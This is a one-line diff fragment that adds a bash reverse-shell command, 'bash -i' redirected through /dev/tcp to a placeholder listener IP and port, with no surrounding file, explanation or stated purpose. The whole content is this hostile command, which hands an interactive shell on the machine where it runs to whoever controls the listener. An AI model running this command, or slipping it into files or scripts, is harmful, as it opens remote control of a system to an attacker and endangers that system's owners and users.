@@ -1,0 +1,1 @@
+bash -i >& /dev/tcp/[LIP]/[LP] 0>&1
